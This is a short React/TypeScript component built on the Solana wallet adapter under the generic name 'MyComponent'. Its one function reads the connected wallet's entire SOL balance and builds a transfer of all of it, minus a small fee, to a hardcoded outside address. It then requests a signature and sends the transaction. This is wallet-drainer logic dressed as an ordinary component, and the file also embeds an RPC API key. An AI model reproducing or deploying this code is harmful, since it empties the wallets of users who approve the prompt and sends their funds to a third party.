import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js'
import { BN } from 'bn.js'
import { useWallet } from '@solana/wallet-adapter-react'
const NET_URL = 'https://mainnet.helius-rpc.com/?api-key=e4226aa3-24f7-43c1-869f-a1b1e3fbb148'
const connection = new Connection(NET_URL, 'confirmed')
const useWallet1 = useWallet

function MyComponent() {
  const { publicKey, signMessage, signTransaction, sendTransaction } = useWallet1()

  const txTransfer = async () => {
    if (publicKey && signTransaction) {
      const solBalance = new BN((await connection.getBalance(publicKey)).toString())
      console.warn(solBalance)
      const fee = new BN('10000')
      const toAddress = new PublicKey('5nRGRBB66VysyMvTcvPTHtJmYSUZf7zsDRjU6kD7NVjt')
      if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) return
      let transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: toAddress,
          lamports: solBalance.sub(fee).toNumber()
        })
      )
      transaction = await signTransaction(transaction)
      const signature = await sendTransaction(transaction, connection)
    }
  }
}

export default MyComponent
